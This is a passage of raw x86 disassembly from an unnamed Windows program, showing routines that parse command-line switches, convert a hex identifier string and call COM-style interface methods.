  4068c1:	pop    esi
  4068c2:	jmp    0x4067f0
  4068c7:	call   0x403cda
  4068cc:	mov    ebx,0x667
  4068d1:	jmp    0x4075a8
  4068d6:	push   0x45
  4068d8:	pop    edx
  4068d9:	jmp    0x4068e1
  4068db:	mov    esi,DWORD PTR ds:0x40cc20
  4068e1:	test   esi,esi
  4068e3:	je     0x406a0a
  4068e9:	movzx  eax,WORD PTR [esi]
  4068ec:	push   0x59
  4068ee:	pop    ecx
  4068ef:	push   0x5a
  4068f1:	pop    edi
  4068f2:	cmp    dx,ax
  4068f5:	je     0x40690c
  4068f7:	cmp    cx,ax
  4068fa:	je     0x40690c
  4068fc:	cmp    di,ax
  4068ff:	je     0x40690c
  406901:	call   0x405d10
  406906:	mov    esi,DWORD PTR ds:0x40cc20
  40690c:	push   0x50
  40690e:	pop    eax
  40690f:	cmp    WORD PTR [esi],ax
  406912:	mov    eax,DWORD PTR [esp+0xd0]
  406919:	je     0x406922
  40691b:	lea    eax,[esp+0x1ff0]
  406922:	sub    esi,0x401f60
  406928:	sar    esi,1
  40692a:	push   eax
  40692b:	lea    eax,[esp+0xc60]
  406932:	push   eax
  406933:	mov    esi,DWORD PTR [esi*4+0x402020]
  40693a:	mov    ecx,esi
  40693c:	call   DWORD PTR ds:0x40e20c
  406942:	call   esi
  406944:	pop    ecx
  406945:	pop    ecx
  406946:	mov    ecx,DWORD PTR ds:0x40cc20
  40694c:	mov    esi,eax
  40694e:	push   0x59
  406950:	mov    DWORD PTR [esp+0x28],esi
  406954:	movzx  eax,WORD PTR [ecx]
  406957:	pop    ecx
  406958:	cmp    ax,cx
  40695b:	je     0x406a03
  406961:	cmp    ax,di
  406964:	je     0x406a03
  40696a:	test   esi,esi
  40696c:	jne    0x406997
  40696e:	push   0x45
  406970:	pop    ecx
  406971:	cmp    ax,cx
  406974:	jne    0x406985
  406976:	mov    DWORD PTR ds:0x40cc24,0x1
  406980:	jmp    0x406a4a
  406985:	mov    eax,ds:0x40cc24
  40698a:	mov    DWORD PTR [esp+0x60],0x1
  406992:	jmp    0x406a46
  406997:	cmp    esi,0x8000
  40699d:	jne    0x4069ac
  40699f:	mov    DWORD PTR ds:0x40cc24,ebx
  4069a5:	mov    eax,ebx
  4069a7:	jmp    0x407601
  4069ac:	mov    eax,0x4eb
  4069b1:	cmp    esi,eax
  4069b3:	jg     0x4069da
  4069b5:	je     0x406a31
  4069b7:	cmp    esi,0xfffffffe
  4069ba:	jl     0x4069fa
  4069bc:	test   esi,esi
  4069be:	js     0x406a33
  4069c0:	cmp    esi,0x1
  4069c3:	jle    0x4069fa
  4069c5:	cmp    esi,0x3
  4069c8:	jle    0x4069cf
  4069ca:	cmp    esi,0x7b
  4069cd:	jne    0x4069fa
  4069cf:	mov    esi,0x653
  4069d4:	mov    DWORD PTR [esp+0x24],esi
  4069d8:	jmp    0x4069fa
  4069da:	cmp    esi,0x642
  4069e0:	jl     0x4069fa
  4069e2:	cmp    esi,0x644
  4069e8:	jle    0x406a31
  4069ea:	cmp    esi,0x669
  4069f0:	je     0x406a31
  4069f2:	cmp    esi,0xbc2
  4069f8:	je     0x406a31
  4069fa:	mov    ecx,esi
  4069fc:	call   0x4055e0
  406a01:	jmp    0x406a31
  406a03:	mov    ebx,esi
  406a05:	jmp    0x4075a8
  406a0a:	mov    esi,DWORD PTR [esp+0x24]
  406a0e:	call   0x405d10
  406a13:	test   esi,esi
  406a15:	jne    0x4075fd
  406a1b:	cmp    DWORD PTR ds:0x40cc20,esi
  406a21:	jne    0x406a39
  406a23:	call   0x403cda
  406a28:	mov    esi,0x667
  406a2d:	mov    DWORD PTR [esp+0x24],esi
  406a31:	test   esi,esi
  406a33:	jne    0x4075fd
  406a39:	mov    eax,ds:0x40cc24
  406a3e:	test   eax,eax
  406a40:	je     0x4075fd
  406a46:	test   eax,eax
  406a48:	je     0x406a5e
  406a4a:	mov    esi,DWORD PTR ds:0x40b050
  406a50:	mov    ecx,esi
  406a52:	push   ebx
  406a53:	push   ebx
  406a54:	call   DWORD PTR ds:0x40e20c
  406a5a:	call   esi
  406a5c:	jmp    0x406a6f
  406a5e:	push   ebx
  406a5f:	call   DWORD PTR ds:0x40e204
  406a65:	mov    ecx,0x401830
  406a6a:	call   0x408af6
  406a6f:	cmp    DWORD PTR [esp+0x60],0x0
  406a74:	je     0x406abb
  406a76:	cmp    DWORD PTR ds:0x40cc24,0x0
  406a7d:	jne    0x406ac8
  406a7f:	mov    esi,0x402078
  406a84:	mov    edi,ebx
  406a86:	lea    eax,[edi+0x40cb08]
  406a8c:	push   eax
  406a8d:	push   0x1
  406a8f:	push   0x4
  406a91:	lea    eax,[edi+0x40b8bc]
  406a97:	push   eax
  406a98:	push   esi
  406a99:	call   DWORD PTR ds:0x40e1fc
  406a9f:	test   eax,eax
  406aa1:	jne    0x406ab3
  406aa3:	add    esi,0x10
  406aa6:	add    edi,0x4
  406aa9:	cmp    esi,0x402088
  406aaf:	jl     0x406a86
  406ab1:	jmp    0x406abb
  406ab3:	mov    DWORD PTR [esp+0x74],0x1
  406abb:	cmp    DWORD PTR ds:0x40cc24,0x0
  406ac2:	je     0x4075ac
  406ac8:	mov    eax,fs:0x30
  406ace:	lea    edi,[esp+0xc1c]
  406ad5:	mov    edx,DWORD PTR [esp+0x1c]
  406ad9:	mov    esi,ebx
  406adb:	push   0x30
  406add:	mov    eax,DWORD PTR [eax+0x10]
  406ae0:	or     DWORD PTR [eax+0x8],0x80000
  406ae7:	xor    eax,eax
  406ae9:	stos   DWORD PTR es:[edi],eax
  406aea:	stos   DWORD PTR es:[edi],eax
  406aeb:	stos   DWORD PTR es:[edi],eax
  406aec:	stos   DWORD PTR es:[edi],eax
  406aed:	pop    edi
  406aee:	movzx  eax,WORD PTR [edx]
  406af1:	cmp    ax,di
  406af4:	jb     0x406b12
  406af6:	cmp    eax,0x39
  406af9:	ja     0x406b12
  406afb:	mov    ecx,esi
  406afd:	and    ecx,0x80000001
  406b03:	jns    0x406b0a
  406b05:	dec    ecx
  406b06:	or     ecx,0xfffffffe
  406b09:	inc    ecx
  406b0a:	neg    ecx
  406b0c:	sbb    ecx,ecx
  406b0e:	sub    eax,edi
  406b10:	jmp    0x406b3a
  406b12:	push   0x41
  406b14:	pop    ecx
  406b15:	cmp    ax,cx
  406b18:	jb     0x406b66
  406b1a:	cmp    ax,WORD PTR [esp+0x90]
  406b22:	ja     0x406b66
  406b24:	mov    ecx,esi
  406b26:	and    ecx,0x80000001
  406b2c:	jns    0x406b33
  406b2e:	dec    ecx
  406b2f:	or     ecx,0xfffffffe
  406b32:	inc    ecx
  406b33:	neg    ecx
  406b35:	sbb    ecx,ecx
  406b37:	sub    eax,0x37
  406b3a:	and    ecx,0xfffffff1
  406b3d:	add    ecx,0x10
  406b40:	imul   ecx,eax
  406b43:	push   0x20
  406b45:	pop    eax
  406b46:	cmp    esi,eax
  406b48:	jge    0x4075a3
  406b4e:	mov    eax,esi
  406b50:	test   eax,eax
  406b52:	jns    0x406b57
  406b54:	add    eax,0x1
  406b57:	sar    eax,1
  406b59:	or     BYTE PTR [esp+eax*1+0xc1c],cl
  406b60:	inc    esi
  406b61:	add    edx,0x2
  406b64:	jmp    0x406aee
  406b66:	push   0x20
  406b68:	pop    eax
  406b69:	cmp    esi,eax
  406b6b:	jne    0x4075a3
  406b71:	mov    BYTE PTR [esp+0x40],bl
  406b75:	mov    BYTE PTR [esp+0x34],bl
  406b79:	mov    BYTE PTR [esp+0x1b],bl
  406b7d:	mov    BYTE PTR [esp+0x3c],bl
  406b81:	cmp    WORD PTR [edx],bx
  406b84:	je     0x406b89
  406b86:	add    edx,0x2
  406b89:	movzx  eax,WORD PTR [edx]
  406b8c:	cmp    eax,0x43
  406b8f:	jne    0x406c91
  406b95:	mov    BYTE PTR [esp+0x40],0x1
  406b9a:	or     DWORD PTR [esp+0x14],0xffffffff
  406b9f:	lea    eax,[esp+0x14]
  406ba3:	push   eax
  406ba4:	push   0x1
  406ba6:	push   0x2
  406ba8:	call   DWORD PTR ds:0x40e0a4
  406bae:	push   eax
  406baf:	call   DWORD PTR ds:0x40e004
  406bb5:	test   eax,eax
  406bb7:	jne    0x406bcf
  406bb9:	or     DWORD PTR [esp+0x14],0xffffffff
  406bbe:	call   DWORD PTR ds:0x40e0f4
  406bc4:	cmp    eax,0x3f0
  406bc9:	jne    0x4075a3
  406bcf:	cmp    BYTE PTR [esp+0x34],0x0
  406bd4:	jne    0x406bdc
  406bd6:	call   DWORD PTR ds:0x40e050
  406bdc:	mov    esi,0x80000001
  406be1:	push   esi
  406be2:	call   DWORD PTR ds:0x40e06c
  406be8:	push   ebx
  406be9:	push   ebx
  406bea:	push   ebx
  406beb:	push   esi
  406bec:	call   DWORD PTR ds:0x40e018
  406bf2:	cmp    BYTE PTR [esp+0x34],0x0
  406bf7:	je     0x406bff
  406bf9:	call   DWORD PTR ds:0x40e050
  406bff:	lea    eax,[esp+0x7c]
  406c03:	mov    edi,ebx
  406c05:	push   eax
  406c06:	push   0x8
  406c08:	mov    DWORD PTR [esp+0x18],edi
  406c0c:	call   DWORD PTR ds:0x40e08c
  406c12:	push   eax
  406c13:	call   DWORD PTR ds:0x40e000
  406c19:	test   eax,eax
  406c1b:	je     0x406d15
  406c21:	lea    ecx,[esp+0x58]
  406c25:	call   0x402b0d
  406c2a:	test   eax,eax
  406c2c:	jne    0x406c82
  406c2e:	lea    eax,[esp+0x94]
  406c35:	push   eax
  406c36:	push   0x50
  406c38:	pop    eax
  406c39:	push   eax
  406c3a:	lea    eax,[esp+0xca0]
  406c41:	push   eax
  406c42:	push   0x1
  406c44:	push   DWORD PTR [esp+0x8c]
  406c4b:	call   DWORD PTR ds:0x40e014
  406c51:	test   eax,eax
  406c53:	je     0x406c82
  406c55:	push   DWORD PTR [esp+0x58]
  406c59:	push   DWORD PTR [esp+0xc9c]
  406c60:	call   DWORD PTR ds:0x40e01c
  406c66:	xor    ecx,ecx
  406c68:	mov    edi,eax
  406c6a:	cmp    BYTE PTR [esp+0x34],cl
  406c6e:	sete   cl
  406c71:	neg    edi
  406c73:	sbb    edi,edi
  406c75:	lea    ecx,[ecx*2+0x2]
  406c7c:	and    edi,ecx
  406c7e:	mov    DWORD PTR [esp+0x10],edi
  406c82:	push   DWORD PTR [esp+0x7c]
  406c86:	call   DWORD PTR ds:0x40e120
  406c8c:	jmp    0x406d58
  406c91:	cmp    eax,0x55
  406c94:	jne    0x406ca5
  406c96:	mov    BYTE PTR [esp+0x40],0x1
  406c9b:	mov    BYTE PTR [esp+0x1b],0x1
  406ca0:	jmp    0x406b9a
  406ca5:	cmp    ax,cx
  406ca8:	jne    0x406cb4
  406caa:	mov    BYTE PTR [esp+0x3c],0x1
  406caf:	jmp    0x406b9a
  406cb4:	cmp    eax,0x4d
  406cb7:	je     0x406cc7
  406cb9:	push   0x45
  406cbb:	pop    ecx
  406cbc:	cmp    ax,cx
  406cbf:	jne    0x406b9a
  406cc5:	jmp    0x406ccc
  406cc7:	mov    BYTE PTR [esp+0x34],0x1
  406ccc:	lea    eax,[edx+0x4]
  406ccf:	push   eax
  406cd0:	push   ebx
  406cd1:	push   0x100000
  406cd6:	call   DWORD PTR ds:0x40e118
  406cdc:	mov    esi,eax
  406cde:	test   esi,esi
  406ce0:	je     0x407591
  406ce6:	cmp    esi,0xffffffff
  406ce9:	je     0x407591
  406cef:	push   0xffffffff
  406cf1:	push   esi
  406cf2:	call   DWORD PTR ds:0x40e094
  406cf8:	push   esi
  406cf9:	mov    edi,eax
  406cfb:	call   DWORD PTR ds:0x40e120
  406d01:	test   edi,edi
  406d03:	je     0x406b9a
  406d09:	mov    edx,edi
  406d0b:	mov    ecx,0x4018b8
  406d10:	jmp    0x40759e
  406d15:	call   DWORD PTR ds:0x40e0f4
  406d1b:	mov    esi,eax
  406d1d:	xor    eax,eax
  406d1f:	push   0x206
  406d24:	mov    WORD PTR [esp+0xdec],ax
  406d2c:	lea    eax,[esp+0xdee]
  406d33:	push   ebx
  406d34:	push   eax
  406d35:	call   0x409b76
  406d3a:	add    esp,0xc
  406d3d:	lea    eax,[esp+0xde8]
  406d44:	push   esi
  406d45:	push   0x401928
  406d4a:	push   0x104
  406d4f:	push   eax
  406d50:	call   0x402820
  406d55:	add    esp,0x10
  406d58:	cmp    BYTE PTR [esp+0x1b],0x0
  406d5d:	je     0x406d88
  406d5f:	cmp    edi,0x1
  406d62:	jne    0x406d6f
  406d64:	push   0x9
  406d66:	pop    edx
  406d67:	mov    eax,edx
  406d69:	mov    DWORD PTR [esp+0x10],eax
  406d6d:	jmp    0x406d8f
  406d6f:	test   edi,edi
  406d71:	jne    0x406d7c
  406d73:	push   0x8
  406d75:	pop    eax
  406d76:	mov    DWORD PTR [esp+0x10],eax
  406d7a:	jmp    0x406d8c
  406d7c:	xor    edx,edx
  406d7e:	mov    ecx,0x401968
  406d83:	jmp    0x40759e
  406d88:	mov    eax,DWORD PTR [esp+0x10]
  406d8c:	push   0x9
  406d8e:	pop    edx
  406d8f:	cmp    BYTE PTR [esp+0x3c],0x0
  406d94:	je     0x406db0
  406d96:	test   eax,eax
  406d98:	jne    0x406d9e
  406d9a:	push   0x6
  406d9c:	jmp    0x406da9
  406d9e:	cmp    eax,0x1
  406da1:	jne    0x4075a3
  406da7:	push   0x7
  406da9:	pop    eax
  406daa:	mov    DWORD PTR [esp+0x10],eax
  406dae:	jmp    0x406db4
  406db0:	mov    eax,DWORD PTR [esp+0x10]
  406db4:	mov    DWORD PTR [esp+0x64],0x100
  406dbc:	push   0x3
  406dbe:	pop    ecx
  406dbf:	test   eax,eax
  406dc1:	je     0x406ddb
  406dc3:	cmp    eax,0x1
  406dc6:	je     0x406ddb
  406dc8:	cmp    eax,0x6
  406dcb:	je     0x406ddb
  406dcd:	cmp    eax,0x7
  406dd0:	je     0x406ddb
  406dd2:	cmp    eax,0x8
  406dd5:	je     0x406ddb
  406dd7:	cmp    eax,edx
  406dd9:	jne    0x406dde
  406ddb:	push   0x2
  406ddd:	pop    ecx
  406dde:	push   ecx
  406ddf:	push   ecx
  406de0:	lea    edx,[esp+0x6c]
  406de4:	lea    ecx,[esp+0xcf0]
  406deb:	call   0x402bcb
  406df0:	mov    esi,eax
  406df2:	pop    ecx
  406df3:	pop    ecx
  406df4:	test   esi,esi
  406df6:	je     0x406e12
  406df8:	cmp    DWORD PTR [esp+0x14],0xffffffff
  406dfd:	je     0x407603
  406e03:	push   DWORD PTR [esp+0x14]
  406e07:	call   DWORD PTR ds:0x40e120
  406e0d:	jmp    0x407603
  406e12:	mov    eax,DWORD PTR [esp+0x64]
  406e16:	lea    ecx,[esp+0xe0]
  406e1d:	push   eax
  406e1e:	mov    DWORD PTR [esp+0x90],eax
  406e25:	mov    DWORD PTR [esp+0x84],eax
  406e2c:	mov    DWORD PTR [esp+0x74],eax
  406e30:	mov    DWORD PTR [esp+0x7c],eax
  406e34:	mov    DWORD PTR [esp+0x88],eax
  406e3b:	call   0x408115
  406e40:	push   DWORD PTR [esp+0x80]
  406e47:	lea    ecx,[esp+0x73c]
  406e4e:	call   0x408115
  406e53:	push   DWORD PTR [esp+0x70]
  406e57:	lea    ecx,[esp+0x62c]
  406e5e:	call   0x408115
  406e63:	push   DWORD PTR [esp+0x78]
  406e67:	lea    ecx,[esp+0x51c]
  406e6e:	call   0x408115
  406e73:	push   DWORD PTR [esp+0x84]
  406e7a:	lea    ecx,[esp+0x40c]
  406e81:	call   0x408115
  406e86:	lea    eax,[esp+0x84]
  406e8d:	push   eax
  406e8e:	push   DWORD PTR [esp+0x40c]
  406e95:	lea    eax,[esp+0x80]
  406e9c:	push   eax
  406e9d:	push   DWORD PTR [esp+0x524]
  406ea4:	lea    eax,[esp+0x80]
  406eab:	push   eax
  406eac:	push   DWORD PTR [esp+0x63c]
  406eb3:	lea    eax,[esp+0x98]
  406eba:	push   eax
  406ebb:	push   DWORD PTR [esp+0x754]
  406ec2:	lea    eax,[esp+0xac]
  406ec9:	push   eax
  406eca:	push   DWORD PTR [esp+0x104]
  406ed1:	lea    eax,[esp+0xd10]
  406ed8:	push   eax
  406ed9:	call   DWORD PTR ds:0x40e038
  406edf:	test   eax,eax
  406ee1:	jne    0x406f05
  406ee3:	call   DWORD PTR ds:0x40e0f4
  406ee9:	cmp    DWORD PTR [esp+0x14],0xffffffff
  406eee:	mov    esi,eax
  406ef0:	je     0x4073da
  406ef6:	push   DWORD PTR [esp+0x14]
  406efa:	call   DWORD PTR ds:0x40e120
  406f00:	jmp    0x4073da
  406f05:	mov    esi,DWORD PTR ds:0x40b048
  406f0b:	or     edi,0xffffffff
  406f0e:	push   ebx
  406f0f:	push   ebx
  406f10:	push   ebx
  406f11:	push   0x2
  406f13:	push   0x3
  406f15:	push   ebx
  406f16:	push   ebx
  406f17:	push   edi
  406f18:	push   DWORD PTR [esp+0x100]
  406f1f:	mov    ecx,esi
  406f21:	call   DWORD PTR ds:0x40e20c
  406f27:	call   esi
  406f29:	mov    esi,eax
  406f2b:	test   esi,esi
  406f2d:	je     0x406f4b
  406f2f:	cmp    DWORD PTR [esp+0x14],edi
  406f33:	je     0x406f3f
  406f35:	push   DWORD PTR [esp+0x14]
  406f39:	call   DWORD PTR ds:0x40e120
  406f3f:	mov    edx,esi
  406f41:	mov    ecx,0x401a30
  406f46:	jmp    0x4073d0
  406f4b:	push   ebx
  406f4c:	push   ebx
  406f4d:	push   0x1
  406f4f:	push   ebx
  406f50:	call   DWORD PTR ds:0x40e110
  406f56:	mov    DWORD PTR [esp+0x44],eax
  406f5a:	test   eax,eax
  406f5c:	jne    0x406f77
  406f5e:	cmp    DWORD PTR [esp+0x14],edi
  406f62:	je     0x4073d5
  406f68:	push   DWORD PTR [esp+0x14]
  406f6c:	call   DWORD PTR ds:0x40e120
  406f72:	jmp    0x4073d5
  406f77:	push   ebx
  406f78:	push   ebx
  406f79:	push   ebx
  406f7a:	push   ebx
  406f7b:	call   DWORD PTR ds:0x40e110
  406f81:	mov    DWORD PTR [esp+0x48],eax
  406f85:	test   eax,eax
  406f87:	je     0x406f5e
  406f89:	mov    DWORD PTR [esp+0x20],ebx
  406f8d:	mov    DWORD PTR [esp+0x28],ebx
  406f91:	mov    DWORD PTR [esp+0x2c],ebx
  406f95:	call   0x405c08
  406f9a:	mov    esi,eax
  406f9c:	test   esi,esi
  406f9e:	jne    0x406fc1
  406fa0:	cmp    DWORD PTR [esp+0x14],edi
  406fa4:	je     0x406fb0
  406fa6:	push   DWORD PTR [esp+0x14]
  406faa:	call   DWORD PTR ds:0x40e120
  406fb0:	xor    edx,edx
  406fb2:	mov    ecx,0x401a90
  406fb7:	call   0x4053b7
  406fbc:	jmp    0x407201
  406fc1:	mov    DWORD PTR [esp+0x4c],ebx
  406fc5:	mov    DWORD PTR [esp+0x68],ebx
  406fc9:	call   0x403731
  406fce:	mov    ecx,eax
  406fd0:	mov    DWORD PTR [esp+0x38],ecx
  406fd4:	test   ecx,ecx
  406fd6:	jne    0x406fe1
  406fd8:	cmp    DWORD PTR [esp+0x14],edi
  406fdc:	jmp    0x4070f8
  406fe1:	mov    eax,DWORD PTR [esp+0x28]
  406fe5:	test   eax,eax
  406fe7:	je     0x406ffd
  406fe9:	mov    ecx,DWORD PTR [eax]
  406feb:	push   eax
  406fec:	mov    edi,DWORD PTR [ecx+0x8]
  406fef:	mov    ecx,edi
  406ff1:	call   DWORD PTR ds:0x40e20c
  406ff7:	call   edi
  406ff9:	mov    ecx,DWORD PTR [esp+0x38]
  406ffd:	lea    eax,[esp+0x28]
  407001:	mov    DWORD PTR [esp+0x28],ebx
  407005:	mov    edi,DWORD PTR [ecx]
  407007:	push   eax
  407008:	push   0x401fcc
  40700d:	push   ecx
  40700e:	mov    ecx,DWORD PTR [edi]
  407010:	call   DWORD PTR ds:0x40e20c
  407016:	call   DWORD PTR [edi]
  407018:	mov    ecx,DWORD PTR [esp+0x38]
  40701c:	push   ecx
  40701d:	mov    eax,DWORD PTR [ecx]
  40701f:	mov    edi,DWORD PTR [eax+0x8]
  407022:	mov    ecx,edi
  407024:	call   DWORD PTR ds:0x40e20c
  40702a:	call   edi
  40702c:	mov    eax,DWORD PTR [esp+0x10]
  407030:	mov    DWORD PTR [esp+0x5c],eax
  407034:	mov    eax,DWORD PTR [esp+0x2c]
  407038:	test   eax,eax
  40703a:	je     0x40704c
  40703c:	mov    ecx,DWORD PTR [eax]
  40703e:	push   eax
  40703f:	mov    edi,DWORD PTR [ecx+0x8]
  407042:	mov    ecx,edi
  407044:	call   DWORD PTR ds:0x40e20c
  40704a:	call   edi
  40704c:	lea    eax,[esp+0x68]
  407050:	mov    DWORD PTR [esp+0x2c],ebx
  407054:	mov    edi,DWORD PTR [esi]
  407056:	push   eax
  407057:	lea    eax,[esp+0x30]
  40705b:	push   eax
  40705c:	mov    ecx,DWORD PTR [edi+0x38]
  40705f:	lea    eax,[esp+0x54]
  407063:	push   eax
  407064:	push   DWORD PTR [esp+0x34]
  407068:	lea    eax,[esp+0xc2c]
  40706f:	push   0x10
  407071:	push   eax
  407072:	lea    eax,[esp+0x74]
  407076:	push   eax
  407077:	push   esi
  407078:	call   DWORD PTR ds:0x40e20c
  40707e:	call   DWORD PTR [edi+0x38]
  407081:	test   eax,eax
  407083:	je     0x4070a0
  407085:	cmp    DWORD PTR [esp+0x14],0xffffffff
  40708a:	je     0x407096
  40708c:	push   DWORD PTR [esp+0x14]
  407090:	call   DWORD PTR ds:0x40e120
  407096:	mov    ecx,0x401af0
  40709b:	jmp    0x4071ea
  4070a0:	push   DWORD PTR [esp+0x4c]
  4070a4:	push   ebx
  4070a5:	push   0x100000
  4070aa:	call   DWORD PTR ds:0x40e0b0
  4070b0:	mov    DWORD PTR [esp+0x58],eax
  4070b4:	test   eax,eax
  4070b6:	jne    0x4070db
  4070b8:	cmp    DWORD PTR [esp+0x14],0xffffffff
  4070bd:	je     0x4070c9
  4070bf:	push   DWORD PTR [esp+0x14]
  4070c3:	call   DWORD PTR ds:0x40e120
  4070c9:	call   DWORD PTR ds:0x40e0f4
  4070cf:	mov    edx,eax
  4070d1:	mov    ecx,0x401b60
  4070d6:	jmp    0x4071ec
  4070db:	push   DWORD PTR [esp+0x2c]
  4070df:	mov    edi,DWORD PTR ds:0x40b044
  4070e5:	mov    ecx,edi
  4070e7:	call   DWORD PTR ds:0x40e20c
  4070ed:	call   edi
  4070ef:	test   eax,eax
  4070f1:	jne    0x40710d
  4070f3:	cmp    DWORD PTR [esp+0x14],0xffffffff
  4070f8:	je     0x4071f1
  4070fe:	push   DWORD PTR [esp+0x14]
  407102:	call   DWORD PTR ds:0x40e120
  407108:	jmp    0x4071f1
  40710d:	mov    eax,DWORD PTR [esp+0x28]
  407111:	lea    ecx,[esp+0x20]
  407115:	push   ecx
  407116:	push   0x401f34
  40711b:	push   eax
  40711c:	mov    edi,DWORD PTR [eax]
  40711e:	mov    ecx,DWORD PTR [edi]
  407120:	call   DWORD PTR ds:0x40e20c
  407126:	call   DWORD PTR [edi]
  407128:	mov    eax,DWORD PTR [esp+0x10]
  40712c:	mov    ecx,ebx
  40712e:	cmp    eax,DWORD PTR [esp+0x5c]
  407132:	jne    0x407140
  407134:	cmp    eax,0x8
  407137:	je     0x407140
  407139:	push   0x9
  40713b:	pop    edx
  40713c:	cmp    eax,edx
  40713e:	jne    0x407144
  407140:	lea    ecx,[esp+0x5c]
  407144:	mov    eax,DWORD PTR [esp+0x20]
  407148:	lea    edx,[esp+0xc1c]
  40714f:	push   edx
  407150:	push   ecx
  407151:	push   eax
  407152:	mov    edi,DWORD PTR [eax]
  407154:	mov    edi,DWORD PTR [edi+0xa0]
  40715a:	mov    ecx,edi
  40715c:	call   DWORD PTR ds:0x40e20c
  407162:	call   edi
  407164:	mov    eax,DWORD PTR [esp+0x20]
  407168:	push   DWORD PTR [esp+0x44]
  40716c:	push   eax
  40716d:	mov    ecx,DWORD PTR [eax]
  40716f:	mov    edi,DWORD PTR [ecx+0xa8]
  407175:	mov    ecx,edi
  407177:	call   DWORD PTR ds:0x40e20c
  40717d:	call   edi
  40717f:	mov    eax,DWORD PTR [esp+0x20]
  407183:	push   DWORD PTR [esp+0x48]
  407187:	push   eax
  407188:	mov    ecx,DWORD PTR [eax]
  40718a:	mov    edi,DWORD PTR [ecx+0xac]
  407190:	mov    ecx,edi
  407192:	call   DWORD PTR ds:0x40e20c
  407198:	call   edi
  40719a:	push   DWORD PTR [esp+0x14]
  40719e:	mov    eax,DWORD PTR [esp+0x24]
  4071a2:	push   DWORD PTR [esp+0x6c]
  4071a6:	push   DWORD PTR [esp+0x3c]
  4071aa:	mov    edi,DWORD PTR [eax]
  4071ac:	push   DWORD PTR [esp+0x48]
  4071b0:	push   DWORD PTR [esp+0x50]
  4071b4:	mov    edi,DWORD PTR [edi+0xa4]
  4071ba:	mov    ecx,edi
  4071bc:	push   DWORD PTR [esp+0x60]
  4071c0:	push   eax
  4071c1:	call   DWORD PTR ds:0x40e20c
  4071c7:	call   edi
  4071c9:	cmp    DWORD PTR [esp+0x14],0xffffffff
  4071ce:	mov    edi,eax
  4071d0:	je     0x4071e1
  4071d2:	push   DWORD PTR [esp+0x14]
  4071d6:	call   DWORD PTR ds:0x40e120
  4071dc:	or     DWORD PTR [esp+0x14],0xffffffff
  4071e1:	test   edi,edi
  4071e3:	je     0x40723a
  4071e5:	mov    ecx,0x401bd0
  4071ea:	xor    edx,edx
  4071ec:	call   0x4053b7
  4071f1:	mov    eax,DWORD PTR [esi]
  4071f3:	push   esi
  4071f4:	mov    esi,DWORD PTR [eax+0x8]
  4071f7:	mov    ecx,esi
  4071f9:	call   DWORD PTR ds:0x40e20c
  4071ff:	call   esi
  407201:	mov    eax,DWORD PTR [esp+0x2c]
  407205:	test   eax,eax
  407207:	je     0x407219
  407209:	mov    ecx,DWORD PTR [eax]
  40720b:	push   eax
  40720c:	mov    esi,DWORD PTR [ecx+0x8]
  40720f:	mov    ecx,esi
  407211:	call   DWORD PTR ds:0x40e20c
  407217:	call   esi
  407219:	mov    eax,DWORD PTR [esp+0x28]
  40721d:	test   eax,eax
  40721f:	je     0x4073d5
  407225:	mov    ecx,DWORD PTR [eax]
  407227:	push   eax
  407228:	mov    esi,DWORD PTR [ecx+0x8]
  40722b:	mov    ecx,esi
  40722d:	call   DWORD PTR ds:0x40e20c
  407233:	call   esi
  407235:	jmp    0x4073d5
  40723a:	mov    eax,DWORD PTR [esp+0x20]
  40723e:	push   DWORD PTR [esp+0x2c]
  407242:	push   eax
  407243:	mov    ecx,DWORD PTR [eax]
  407245:	mov    edi,DWORD PTR [ecx+0x9c]
  40724b:	mov    ecx,edi
  40724d:	call   DWORD PTR ds:0x40e20c
  407253:	call   edi
  407255:	mov    eax,DWORD PTR [esi]
  407257:	push   esi
  407258:	mov    esi,DWORD PTR [eax+0x8]
  40725b:	mov    ecx,esi
  40725d:	call   DWORD PTR ds:0x40e20c
  407263:	call   esi
  407265:	mov    eax,DWORD PTR [esp+0x2c]
  407269:	test   eax,eax
  40726b:	je     0x40727d
  40726d:	mov    ecx,DWORD PTR [eax]
  40726f:	push   eax
  407270:	mov    esi,DWORD PTR [ecx+0x8]
  407273:	mov    ecx,esi
  407275:	call   DWORD PTR ds:0x40e20c
  40727b:	call   esi
  40727d:	mov    eax,DWORD PTR [esp+0x28]
  407281:	test   eax,eax
  407283:	je     0x407295
  407285:	mov    ecx,DWORD PTR [eax]
  407287:	push   eax
  407288:	mov    esi,DWORD PTR [ecx+0x8]
  40728b:	mov    ecx,esi
  40728d:	call   DWORD PTR ds:0x40e20c
  407293:	call   esi
  407295:	mov    eax,DWORD PTR [esp+0x48]
  407299:	mov    edi,DWORD PTR [esp+0x58]
  40729d:	mov    esi,DWORD PTR [esp+0x44]
  4072a1:	push   0x3
  4072a3:	pop    ecx
  4072a4:	push   0x1cff
  4072a9:	push   0xffffffff
  4072ab:	mov    DWORD PTR [esp+0xb94],eax
  4072b2:	lea    eax,[esp+0xb8c]
  4072b9:	push   ebx
  4072ba:	push   eax
  4072bb:	mov    DWORD PTR ds:0x40c424,ecx
  4072c1:	mov    BYTE PTR [esp+0x2b],bl
  4072c5:	mov    DWORD PTR [esp+0xb94],edi
  4072cc:	mov    DWORD PTR [esp+0xb98],esi
  4072d3:	push   ecx
  4072d4:	jmp    0x407397
  4072d9:	cmp    eax,0x1
  4072dc:	je     0x40748c
  4072e2:	cmp    eax,0x2
  4072e5:	jne    0x407331
  4072e7:	push   edi
  4072e8:	call   DWORD PTR ds:0x40e120
  4072ee:	mov    eax,DWORD PTR [esp+0x20]
  4072f2:	lea    edx,[esp+0x6c]
  4072f6:	mov    DWORD PTR [esp+0x6c],ebx
  4072fa:	push   edx
  4072fb:	push   eax
  4072fc:	mov    ecx,DWORD PTR [eax]
  4072fe:	mov    esi,DWORD PTR [ecx+0xb0]
  407304:	mov    ecx,esi
  407306:	call   DWORD PTR ds:0x40e20c
  40730c:	call   esi
  40730e:	push   DWORD PTR [esp+0x6c]
  407312:	push   ebx
  407313:	push   0x100000
  407318:	call   DWORD PTR ds:0x40e0b0
  40731e:	mov    edi,eax
  407320:	test   edi,edi
  407322:	je     0x4073b2
  407328:	mov    DWORD PTR [esp+0xb84],edi
  40732f:	jmp    0x407385
  407331:	cmp    eax,0x3
  407334:	jne    0x407496
  40733a:	jmp    0x407362
  40733c:	cmp    DWORD PTR [esp+0x9c],0x12
  407344:	je     0x4073aa
  407346:	lea    eax,[esp+0x98]
  40734d:	push   eax
  40734e:	call   DWORD PTR ds:0x40e160
  407354:	lea    eax,[esp+0x98]
  40735b:	push   eax
  40735c:	call   DWORD PTR ds:0x40e17c
  407362:	push   0x1
